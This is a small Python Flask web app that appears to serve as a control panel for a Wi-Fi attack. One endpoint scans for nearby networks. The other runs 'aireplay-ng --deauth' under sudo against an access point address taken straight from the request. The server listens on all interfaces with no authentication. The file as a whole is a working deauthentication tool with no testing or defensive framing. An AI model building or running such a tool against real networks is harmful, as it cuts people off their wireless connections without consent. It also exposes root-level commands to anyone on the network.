from flask import Flask, render_template, jsonify, request
import subprocess

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/scan', methods=['POST'])
def scan():
    # Command to scan for networks; adjust based on your setup
    command = ['sudo', 'iwlist', 'wlan1', 'scan']
    result = subprocess.run(command, capture_output=True, text=True)
    return jsonify(result.stdout)


@app.route('/deauth', methods=['POST'])
def deauth():
    target = request.json['target']
    # Command to deauthenticate; adjust based on your setup
    command = ['sudo', 'aireplay-ng', '--deauth', '100', '-a', target, 'wlan1']
    result = subprocess.run(command, capture_output=True, text=True)
    return jsonify(result.stdout)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
